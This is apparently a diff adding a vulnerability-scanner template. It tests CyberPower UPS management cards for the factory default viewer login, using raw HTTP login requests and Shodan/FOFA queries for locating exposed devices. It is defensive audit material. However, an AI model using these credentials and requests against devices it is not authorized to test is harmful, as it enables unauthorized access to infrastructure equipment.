@@ -1,0 +1,110 @@
+id: cyber-power-ups-default-login
+
+info:
+  name: CyberPower UPS Remote Management - Default Login
+  author: mr-pmillz
+  severity: medium
+  description: |
+    CyberPower UPS Remote Management accepts the default device/cyber credentials for its viewer account when the factory password has not been changed.
+  impact: |
+    An attacker can obtain read-only access to UPS status and configuration information exposed to the viewer account.
+  remediation: |
+    Change the viewer account's default password or disable the account when it is not needed, and restrict management access to trusted networks.
+  reference:
+    - https://dl4jz3rbrsfum.cloudfront.net/documents/CyberPower_GU_RMCARD202.pdf
+  classification:
+    cwe-id: CWE-1392
+  metadata:
+    verified: true
+    max-request: 7
+    shodan-query: 'http.html:"login_pass.cgi" http.html:"CyberPower"'
+    fofa-query: 'body="login_pass.cgi" && body="CyberPower"'
+    vendor: cyberpower
+    product: remote_management_card
+  tags: default-login,cyberpower,ups,intrusive
+
+variables:
+  username: device
+  password: cyber
+
+flow: http(1) && http(2) && http(3) && http(4) && http(5) && http(6) && http(7)
+
+http:
+  - raw:
+      - |
+        GET /login.html HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        internal: true
+
+      - type: word
+        part: body
+        words:
+          - CyberPower
+          - login_pass.cgi
+        condition: and
+        internal: true
+
+      - type: regex
+        part: header
+        internal: true
+        regex:
+          - '(?im)^Set-Cookie:\s*cocp=[^;\r\n]+'
+
+  - raw:
+      - |
+        GET /login_pass.cgi?username={{url_encode(username)}}&password={{url_encode(password)}}&action=LOGIN HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: status
+        status:
+          - 303
+        internal: true
+
+  - raw:
+      - |
+        GET /login_pass.html HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Referer: {{RootURL}}/login.html
+
+  - raw:
+      - |
+        GET /login_counter.html?stap=0 HTTP/1.1
+        Host: {{Hostname}}
+        Referer: {{RootURL}}/login_pass.html
+
+  - raw:
+      - |
+        GET /login_counter.html?stap=1 HTTP/1.1
+        Host: {{Hostname}}
+        Referer: {{RootURL}}/login_pass.html
+
+  - raw:
+      - |
+        GET /login_counter.html?stap=2 HTTP/1.1
+        Host: {{Hostname}}
+        Referer: {{RootURL}}/login_pass.html
+
+  - raw:
+      - |
+        GET /login.cgi?action=LOGIN HTTP/1.1
+        Host: {{Hostname}}
+        Referer: {{RootURL}}/login.html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 303
+
+      - type: regex
+        part: header
+        regex:
+          - '(?im)^Location:\s*(?:https?://[^/]+)?/summary\.html(?:\b|[?#])'
